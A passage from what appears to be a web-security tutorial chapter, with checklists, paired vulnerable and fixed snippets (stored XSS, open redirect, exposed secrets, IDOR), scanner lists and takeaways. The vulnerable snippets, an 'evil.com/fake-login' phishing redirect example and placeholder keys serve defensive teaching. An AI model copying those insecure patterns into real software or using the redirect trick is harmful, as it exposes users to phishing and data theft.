‚úÖ Implement rate limiting
‚úÖ Sanitize and escape output
```

---

### Iframe Security ‚úì

```
‚úÖ Use sandbox attribute
‚úÖ Minimize sandbox permissions
‚úÖ Set X-Frame-Options header
‚úÖ Use CSP frame-ancestors
‚úÖ Only embed trusted content
‚úÖ Validate iframe sources
```

---

### External Resources ‚úì

```
‚úÖ Use rel="noopener noreferrer" on external links
‚úÖ Implement Subresource Integrity (SRI)
‚úÖ Whitelist external domains in CSP
‚úÖ Verify third-party scripts
‚úÖ Regularly audit dependencies
```

---

## Common Security Vulnerabilities

### 1. XSS in Comments

```html
<!-- ‚ùå VULNERABLE CODE -->
<div class="comment">
  <!-- User comment stored from database -->
  <?php echo $comment; ?>
</div>

<!-- ‚úÖ SECURE CODE -->
<div class="comment">
  <?php echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8'); ?>
</div>
```

---

### 2. Open Redirect

```html
<!-- ‚ùå VULNERABLE: Redirect to any URL -->
<script>
  const redirect = new URLSearchParams(window.location.search).get('url');
  window.location.href = redirect;
  // Attacker uses: ?url=https://evil.com/fake-login
</script>

<!-- ‚úÖ SECURE: Whitelist allowed domains -->
<script>
  const redirect = new URLSearchParams(window.location.search).get('url');
  const allowed = ['/', '/home', '/about', '/contact'];
  
  if (allowed.includes(redirect)) {
    window.location.href = redirect;
  } else {
    window.location.href = '/'; // Default safe redirect
  }
</script>
```

---

### 3. Sensitive Data Exposure

```html
<!-- ‚ùå EXPOSED: Sensitive data in HTML comments -->
<!--
  Admin password: admin123
  API Key: sk_live_abc123xyz
  Database: db.example.com:5432
-->

<!-- ‚ùå EXPOSED: Sensitive data in JavaScript -->
<script>
  const apiKey = 'sk_live_abc123xyz'; // Visible in source!
</script>

<!-- ‚úÖ SECURE: Use environment variables server-side -->
<!-- Never expose keys/passwords in HTML/JavaScript -->
```

---

### 4. Insecure Direct Object References

```html
<!-- ‚ùå VULNERABLE: User can change ID in URL -->
<!-- URL: /user/profile?id=123 -->
<script>
  const userId = new URLSearchParams(window.location.search).get('id');
  fetch(`/api/user/${userId}`)  // Attacker changes to id=124
    .then(r => r.json())
    .then(data => displayProfile(data));
</script>

<!-- ‚úÖ SECURE: Use session-based authentication -->
<script>
  // Server validates user owns this data
  fetch('/api/user/me')  // Gets current user only
    .then(r => r.json())
    .then(data => displayProfile(data));
</script>
```

---

## Security Testing Tools

### Automated Scanners

```
1. OWASP ZAP (Zed Attack Proxy)
   - Free, open-source
   - Scans for vulnerabilities
   - https://www.zaproxy.org/

2. Burp Suite
   - Professional security testing
   - https://portswigger.net/burp

3. Mozilla Observatory
   - Online security scanner
   - https://observatory.mozilla.org/

4. Security Headers
   - Check security headers
   - https://securityheaders.com/
```

---

### Manual Testing

```
‚úì Try XSS payloads in all inputs
‚úì Check for CSRF protection
‚úì Verify HTTPS everywhere
‚úì Test file upload restrictions
‚úì Check CSP is enforced
‚úì Verify external links have rel="noopener"
‚úì Test iframe sandbox restrictions
‚úì Check for sensitive data in source
‚úì Verify authentication on all protected pages
‚úì Test rate limiting on forms
```

---

## Key Takeaways from Chapter 13

### XSS Prevention:
1. **Never trust user input** - Always sanitize and escape
2. **Use textContent** - Not innerHTML with user data
3. **Escape HTML entities** - Before outputting
4. **Content Security Policy** - Block inline scripts
5. **Framework protection** - React/Vue/Angular escape by default

### CSRF Prevention:
6. **CSRF tokens required** - For all state-changing forms
7. **Validate server-side** - Client-side can be bypassed
8. **SameSite cookies** - Strict or Lax
9. **Check Origin/Referer** - Additional validation

### HTTPS:
10. **HTTPS everywhere** - No HTTP allowed
11. **HSTS header** - Force HTTPS
12. **Secure cookies** - Secure flag required
13. **Mixed content** - All resources must be HTTPS

### Forms:
14. **Server-side validation** - Always validate on server
15. **Input length limits** - maxlength attribute
16. **File upload validation** - Type, size, content
17. **Rate limiting** - Prevent abuse
18. **Autocomplete off** - For sensitive fields (when appropriate)

### Iframes:
19. **Sandbox attribute** - Restrict capabilities
20. **X-Frame-Options** - Prevent clickjacking
21. **CSP frame-ancestors** - Modern clickjacking prevention
22. **Only embed trusted** - Minimize iframe usage

### External Resources:
23. **rel="noopener noreferrer"** - On target="_blank" links
24. **Subresource Integrity** - Verify CDN files
25. **Whitelist domains** - In CSP policy

### Cookies:
26. **HttpOnly flag** - Prevent JavaScript access
27. **Secure flag** - HTTPS only
28. **SameSite attribute** - CSRF protection

### General:
29. **Keep dependencies updated** - Security patches
30. **Regular security audits** - Scan for vulnerabilities
31. **Principle of least privilege** - Minimal permissions
32. **Defense in depth** - Multiple security layers
33. **Log security events** - Monitor for attacks
34. **Incident response plan** - Be prepared

### Never Do:
35. ‚ùå Store passwords in localStorage
36. ‚ùå Trust client-side validation alone
37. ‚ùå Use innerHTML with user input
38. ‚ùå Expose API keys in HTML/JavaScript
39. ‚ùå Allow file uploads without validation
40. ‚ùå Use HTTP for sensitive data

Master security and protect your users, data, and reputation! üîíüõ°Ô∏è